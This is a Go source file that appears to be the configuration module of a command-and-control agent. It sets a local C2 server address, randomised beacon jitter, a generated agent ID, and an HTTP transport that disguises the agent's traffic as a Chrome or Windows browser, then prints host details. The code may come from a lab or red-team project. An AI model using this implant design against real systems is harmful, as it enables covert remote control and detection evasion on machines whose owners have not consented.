package main

import (
	"crypto/rand"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"time"

	"c2-agent/funcs"
)

var (
	ServerURL string = "http://localhost:5000"
	JitterMin        = 8 * time.Second
	JitterMax        = 15 * time.Second
	ProfileID int    = 1
	Locale    string = "en-US,en;q=0.9"
	AgentID   string
)

func generateUUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40 // version 4
	b[8] = (b[8] & 0x3f) | 0x80 // variant 10
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func InitConfig() {
	AgentID = generateUUID()

	profile, ok := funcs.Profiles[ProfileID]
	if !ok {
		profile = funcs.Profiles[1] // fallback to Chrome/Windows
	}

	// Set Accept-Language from the locale baked in at build time
	profile.Headers["Accept-Language"] = Locale

	// Replace the default HTTP client so every request the agent makes
	// goes through the browser profile transport automatically
	http.DefaultClient = &http.Client{
		Transport: &funcs.UATransport{
			Base:    http.DefaultTransport,
			Profile: profile,
		},
	}

	fmt.Println("=======================================")
	fmt.Println("       C2 Agent  Initialized           ")
	fmt.Println("=======================================")
	fmt.Printf("  Agent ID  : %s\n", AgentID)
	fmt.Printf("  Server    : %s\n", ServerURL)
	fmt.Printf("  Jitter    : %s to %s\n", JitterMin, JitterMax)
	fmt.Printf("  Profile   : %s\n", profile.Name)
	fmt.Printf("  Locale    : %s\n", Locale)
	fmt.Printf("  OS/Arch   : %s/%s\n", runtime.GOOS, runtime.GOARCH)

	hostname, err := os.Hostname()
	if err == nil {
		fmt.Printf("  Hostname  : %s\n", hostname)
	}

	fmt.Println("=======================================")
}
